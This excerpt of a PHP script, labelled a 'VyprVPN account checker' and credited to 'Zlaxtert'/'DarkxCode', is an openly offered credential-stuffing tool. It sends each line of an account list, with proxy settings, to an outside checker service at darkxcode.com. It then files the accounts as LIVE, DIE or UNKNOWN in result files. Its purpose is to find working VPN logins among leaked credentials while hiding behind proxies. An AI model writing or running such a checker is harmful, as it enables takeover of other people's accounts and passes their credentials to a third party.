...
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : VYPRVPN ACCOUNT CHECKER
 * VERSION  : 1.0
...
foreach ($lists as $list) {
    ...
    $api = "https://darkxcode.com/checker/vyperVPN_checker/?list=$list&proxy=$Proxies&proxyPWD=$proxy_pass";
    // CURL
    $ch = curl_init();
    ...
    if(strpos($x, '"status":"success"')){
        ...
        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $list$DEF | [$YL VALID$DEF:$WH true$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }else if (strpos($x, '"status":"failed"')){
        $die++;
        save_file("result/die.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL VALID$DEF:$WH false$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }else{
        $unknown++;
        save_file("result/unknown.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $list$DEF | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }
